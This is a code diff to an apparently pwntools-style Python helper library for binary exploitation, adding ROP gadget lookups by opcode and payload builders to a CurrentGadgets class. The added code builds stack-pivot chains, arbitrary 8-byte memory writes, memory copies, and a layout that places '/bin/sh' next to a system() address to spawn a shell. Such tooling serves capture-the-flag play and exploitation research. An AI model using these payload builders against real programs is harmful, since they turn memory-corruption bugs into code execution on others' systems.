@@ -26,8 +26,9 @@ from .misc import (_in_tmux, _in_wsl, errlog_exit, get_callframe_info,
                    get_flag_when_get_shell, get_segment_base_addr_by_proc_maps,
                    ldd_get_libc_path, log2_ex, log_code_base_addr, log_ex,
                    log_libc_base_addr, one_gadget, one_gadget_binary,
-                   recv_libc_addr, warn_ex)
+                   recv_libc_addr, warn_ex, step_split, u64_ex)
 from .syscall_num import SyscallNumber
+from typing import Union
 
 __all__ = [
     "stop",
@@ -646,9 +647,9 @@ class CurrentGadgets:
             CurrentGadgets.__internal_gadgetbox = RopgadgetBox()
         except:
             try:
-                CurrentGadgets.__internal_gadgetbox = RopperBox()
-            except:
                 CurrentGadgets.__internal_gadgetbox = ElfGadgetBox()
+            except:
+                CurrentGadgets.__internal_gadgetbox = RopperBox()
 
         res = False
         if elf:
@@ -715,8 +716,8 @@ class CurrentGadgets:
             return res
         
         if not CurrentGadgets.__find_in_elf and not CurrentGadgets.__find_in_libc:
-            log2_ex("Have closed both elf finder and libc finder, please call 'CurrentGadgets.set_find_area' to set a finder.")
-        errlog_exit("Cannot find gadget using '{}'.".format(func_name))
+            log2_ex("Have closed both elf finder and libc finder, please call CurrentGadgets.set_find_area to set a finder.")
+        raise RuntimeError("Cannot find gadget using '{}'.".format(func_name))
 
 
     @staticmethod
@@ -751,8 +752,8 @@ class CurrentGadgets:
             return func(find ,'libc', get_list)
 
         if not CurrentGadgets.__find_in_elf and not CurrentGadgets.__find_in_libc:
-            errlog_exit("Have closed both elf finder and libc finder, please call 'CurrentGadgets.set_find_area' to set a finder!")
-        errlog_exit("Cannot find gadget: {}.".format(find_str))
+            errlog_exit("Have closed both elf finder and libc finder.")
+        raise RuntimeError("Cannot find gadget: {}.".format(find_str))
 
 
     @staticmethod
@@ -827,8 +828,67 @@ class CurrentGadgets:
         return CurrentGadgets._internal_find('get_pop_rsi_r15_ret')
 
     @staticmethod
+    def pop_pop_ret() -> int:
+        """pop xxx; pop xxx; ret"""
+        try:
+            return CurrentGadgets.find_gadget('5b5dc3', 'opcode')
+        except:
+            pass
+        try:
+            return CurrentGadgets.find_gadget('5f5dc3', 'opcode')
+        except:
+            pass
+
+        return CurrentGadgets.find_gadget('415e415fc3', 'opcode')
+
+    @staticmethod
+    def pop_pop_pop_ret() -> int:
+        """pop xxx; pop xxx; pop xxx; ret"""
+        try:
+            return CurrentGadgets.find_gadget('585b5dc3', 'opcode')
+        except:
+            pass
+        try:
+            return CurrentGadgets.find_gadget('585A5BC3', 'opcode')
+        except:
+            pass
+
+        return CurrentGadgets.find_gadget('415d415e415fc3', 'opcode')
+
+    @staticmethod
+    def pop_pop_pop_pop_ret() -> int:
+        """pop xxx; pop xxx; pop xxx; pop xxx; ret"""    
+        res =  CurrentGadgets.find_gadget('415C415D415E415FC3', 'opcode')
+        assert CurrentGadgets.__arch == "amd64", "only for amd64"
+        return res
+    
+    @staticmethod
+    def pop_pop_pop_pop_pop_ret() -> int:
+        """pop xxx; pop xxx; pop xxx; pop xxx; pop xxx; ret"""
+        res =  CurrentGadgets.find_gadget('5D415C415D415E415FC3', 'opcode')
+        assert CurrentGadgets.__arch == "amd64", "only for amd64"
+        return res
+
+    @staticmethod
+    def pop_pop_pop_pop_pop_pop_ret() -> int:
+        """pop xxx; pop xxx; pop xxx; pop xxx; pop xxx; ret"""
+
+        res =  CurrentGadgets.find_gadget('5B5D415C415D415E415FC3', 'opcode')
+        assert CurrentGadgets.__arch == "amd64", "only for amd64"
+        return res
+
+    @staticmethod
+    def mov_rsp_rdx_ret() -> int:
+        """mov rsp, rdx; ret"""
+        res = CurrentGadgets.find_gadget('4889D4C3', 'opcode')
+        assert CurrentGadgets.__arch == "amd64", "only for amd64"
+        return res
+
+    @staticmethod
     def magic_gadget() -> int:
-        """add dword ptr [rbp - 0x3d], ebx"""
+        """add dword ptr [rbp - 0x3d], ebx; ret"""
+        if not CurrentGadgets._initial_gadgetbox(): 
+            return 0
         assert CurrentGadgets.__arch == "amd64", "only for amd64"
         return CurrentGadgets._internal_find('get_magic_gadget')
 
@@ -848,12 +908,211 @@ class CurrentGadgets:
         return CurrentGadgets._internal_find('get_sh')
     
     @staticmethod
+    def stack_pivot_from_rdi_gadget() -> int:
+        """mov rbp, qword ptr [rdi + 0x48];
+    
+        mov rax, qword ptr [rbp + 0x18]; 
+        
+        lea r13, [rbp + 0x10]; 
+        
+        mov dword ptr [rbp + 0x10], 0; 
+        
+        mov rdi, r13; 
+        
+        call qword ptr [rax + 0x28];"""
+        res = CurrentGadgets.find_gadget('488B6F48488B45184C8D6D10C74510000000004C89EFFF5028', 'opcode')
+        assert CurrentGadgets.__arch == "amd64", "only for amd64"
+        return res
+    
+
+    @staticmethod
+    def control_rdx_from_rdi_gadget() -> int:
+        """mov rdx, [rdi + 8]; mov [rsp], rax; call [rdx + 0x20]"""
+        res = CurrentGadgets.find_gadget('488B570848890424FF5220  ', 'opcode')
+        assert CurrentGadgets.__arch == "amd64", "only for amd64"
+        return res
+
+    @staticmethod
+    def control_rdx_from_rdi_gadget_payload(rdi_addr: int, ropchain: Union[bytes, list, tuple, dict]) -> bytes:
+        """mov rdx, [rdi + 8]; mov [rsp], rax; call [rdx + 0x20]'s rop payload"""
+        if not CurrentGadgets._initial_gadgetbox(): 
+            return 0
+        layout = [
+            CurrentGadgets.pop_pop_pop_pop_ret(),
+            rdi_addr,
+            0,
+            0,
+            CurrentGadgets.mov_rsp_rdx_ret(),
+            ropchain
+        ]
+        return flat(layout)
+
+    @staticmethod
+    def control_rdx_from_rdi_gadget_payload_system_binsh(rdi_addr: int, system_addr: int) -> bytes:
+        """mov rdx, [rdi + 8]; mov [rsp], rax; call [rdx + 0x20]'s rop payload to execuate system(/bin/sh)"""
+        if not CurrentGadgets._initial_gadgetbox(): 
+            return 0
+        layout = [
+            0x68732f6e69622f,
+            rdi_addr-0x10,
+            system_addr
+        ]
+        return flat(layout)
+
+
+    @staticmethod
+    def stack_pivot_from_rdi_gadget_rdi_payload(rdi_addr, ropchain: bytes) -> bytes:
+        """Gadget: mov rbp, qword ptr [rdi + 0x48];
+        mov rax, qword ptr [rbp + 0x18]; 
+        lea r13, [rbp + 0x10]; 
+        mov dword ptr [rbp + 0x10], 0; 
+        mov rdi, r13; 
+        call qword ptr [rax + 0x28];
+    
+        set rdi payload data for stack_pivot_from_rdi_gadget. make sure rdi has enough space, at least 'len(ropchain) + 0x48'
+        
+        ropchain is:
+        
+        pop rdi; ret; 
+        
+        stack_pivot_from_rdi_gadget_rdi_payload(XXX); 
+        
+        stack_pivot_from_rdi_gadget()
+        """
+        res = flat({
+            0x8: CurrentGadgets.pop_pop_ret(),
+            0x18: rdi_addr,
+            0x20: CurrentGadgets.pop_pop_ret(),
+            0x28: CurrentGadgets.leave_ret(),
+            0x38: CurrentGadgets.pop_pop_ret(),
+            0x48: rdi_addr,
+            0x50: ropchain
+        })
+        assert CurrentGadgets.__arch == "amd64", "only for amd64"
+        return res
+
+    @staticmethod
+    def stack_pivot_from_rdi_gadget_rdi_payload_ex(rdi_addr, ropchain_or_funcaddr: Union[int, bytes], 
+                                                   rop_rdi_reg: int, rop_rsi_reg: int=0,  rop_rdx_reg: int=0) -> bytes:
+        """Gadget: mov rbp, qword ptr [rdi + 0x48];
+        mov rax, qword ptr [rbp + 0x18]; 
+        lea r13, [rbp + 0x10]; 
+        mov dword ptr [rbp + 0x10], 0; 
+        mov rdi, r13; 
+        call qword ptr [rax + 0x28];
+        
+        set rdi payload data for stack_pivot_from_rdi_gadget. make sure rdi has enough space, at least '0x50'
+        
+        For example: stack_pivot_from_rdi_gadget_rdi_payload_ex(XXXX, write_addr, 1, buf, 0x30) or stack_pivot_from_rdi_gadget_rdi_payload_ex(XXXX, buf, puts_addr)
+        
+        ropchain is:
+        
+        pop rdi; ret; 
+        
+        stack_pivot_from_rdi_gadget_rdi_payload_ex(XXX); 
+        
+        stack_pivot_from_rdi_gadget()
+        """
+        if not rop_rdx_reg:
+            assert isinstance(ropchain_or_funcaddr, int), "must be int!"
+            layout = [
+                CurrentGadgets.pop_pop_ret(),
+                0,
+                rdi_addr + 0x18,
+                CurrentGadgets.pop_rdi_ret(),
+                rop_rdi_reg,
+                CurrentGadgets.__try_get_rsi_gadget(rop_rsi_reg),
+                ropchain_or_funcaddr,
+                CurrentGadgets.leave_ret(), 
+                rdi_addr - 8
+            ]
+        else:
+            layout = [
+                CurrentGadgets.pop_pop_ret(),
+                0,
+                rdi_addr + 0x28,
+                CurrentGadgets.pop_rdi_ret(),
+                rop_rdi_reg,
+                CurrentGadgets.__try_get_rsi_gadget(rop_rsi_reg),
+                CurrentGadgets.find_gadget('5A595BC3', 'opcode'),# pop rdx, pop rcx, pop rbx, ret 
+                rop_rdx_reg, 
+                rdi_addr - 0x8, 
+                CurrentGadgets.leave_ret(),
+                ropchain_or_funcaddr
+            ]
+        res = flat(layout)
+        assert CurrentGadgets.__arch == "amd64", "only for amd64"
+        return res
+
+    @staticmethod
+    def write8bytes_at_addr(addr: int, number: int) -> bytes:
+        """ *addr = number """
+        if not CurrentGadgets._initial_gadgetbox():
+            return None
+        assert CurrentGadgets.__arch == "amd64", "only for amd64"
+        # mov qword ptr [rax], rdi; ret;
+        layout = [
+            CurrentGadgets.pop_rax_ret(),
+            addr, 
+            CurrentGadgets.pop_rdi_ret(),
+            number,
+            CurrentGadgets.find_gadget('488938C3', 'opcode')
+        ]
+        try:
+            return flat(layout)
+        except:
+            pass
+        # mov qword ptr [rax], rdx; ret;
+        layout = [
+            CurrentGadgets.pop_rax_ret(),
+            addr,
+            CurrentGadgets.__try_get_rdx_gadget(number),
+            CurrentGadgets.find_gadget('488910C3', 'opcode')
+        ]
+        return flat(layout)
+    
+    @staticmethod
+    def write_at_addr(addr: int, payload: bytes) -> bytes:
+        res = []
+        for curp in step_split(payload, 8):
+            num = u64_ex(curp)
+            res.append(CurrentGadgets.write8bytes_at_addr(addr, num))
+            addr += 8
+        return flat(res)
+
+    @staticmethod
+    def copy_byte2byte(src_addr: int, dst_addr: int, length: int, do_cld=True) -> bytes:
+        """Use reps to copy data"""
+        if not CurrentGadgets._initial_gadgetbox():
+            return None
+
+        layout = [
+            CurrentGadgets.__try_get_rsi_gadget(src_addr),
+            CurrentGadgets.pop_rdi_ret(),
+            dst_addr,
+            CurrentGadgets.pop_rcx_ret(),
+            length
+        ]
+        if do_cld:
+            layout.append(CurrentGadgets.find_gadget('fcc3', 'opcode'))
+        
+        layout.append(CurrentGadgets.find_gadget('f3a4c3', 'opcode'))
+        
+        return flat(layout)
+
+    @staticmethod
     def __try_get_rdx_gadget(rdx_val, rbx_val=0) -> list:
         try:
-            addr = CurrentGadgets.pop_rdx_ret()
-            return [addr, rdx_val]
+            return [CurrentGadgets.pop_rdx_ret(), rdx_val]
         except:
             return [CurrentGadgets.pop_rdx_rbx_ret(), rdx_val, rbx_val]
+
+    @staticmethod
+    def __try_get_rsi_gadget(rsi_val, r15_val=0) -> list:
+        try:
+            return [CurrentGadgets.pop_rsi_ret(), rsi_val]
+        except:
+            return [CurrentGadgets.pop_rsi_r15_ret(), rsi_val, r15_val]
 
     @staticmethod
     def __inner_chain(i386_num, syscall_num, para1, para2=None, para3=None) -> bytes:
@@ -886,8 +1145,7 @@ class CurrentGadgets:
                 para1
                 ]
             if para2 is not None:
-                layout.append(CurrentGadgets.pop_rsi_ret())
-                layout.append(para2)
+                layout.append(CurrentGadgets.__try_get_rsi_gadget(para2))
             
             if para3 is not None:
                 layout.append(CurrentGadgets.__try_get_rdx_gadget(para3))
@@ -898,7 +1156,7 @@ class CurrentGadgets:
             return flat(layout)
         else:
             errlog_exit("Unsupported arch: {}".format(CurrentGadgets.__arch))
-        
+    
 
     @staticmethod
     def syscall_chain(syscall_num, para1, para2=None, para3=None) -> bytes:
